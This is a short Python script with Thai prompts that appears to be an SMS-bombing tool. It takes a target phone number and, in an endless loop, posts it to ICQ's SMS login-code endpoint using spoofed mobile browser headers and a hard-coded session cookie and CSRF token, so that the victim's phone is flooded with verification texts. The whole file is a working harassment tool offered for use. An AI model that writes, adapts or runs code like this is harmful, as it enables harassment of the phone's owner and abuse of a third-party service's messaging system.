import requests
import os,sys

os.system('clear')

print('\n')
phone = input('เบอร์ : ')
print('\n')

while 1==1:
	requests.post('https://icq.com/smscode/login/ru',data=f'msisdn={phone}',headers={'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','User-Agent': 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36','Cookie': '_ga=GA1.2.1621707397.1646539138; tmr_lvid=9e111ca0bdfa20ce32ecfc30164fe745; tmr_lvidTS=1646539138109; _gid=GA1.2.1643108060.1646984866; tmr_detect=0%7C1646984867918; user_tracking=4783d109e2a5ce9cf30bf32426926109; tmr_reqNum=10; mr1lad=622afed77d274d22-300-300-; csrf=8620d9b378a35f23eb514530348bd79c'})
	print('ยิงละเด้ออออ ฝากกดติดตามนำเด้อคับ')
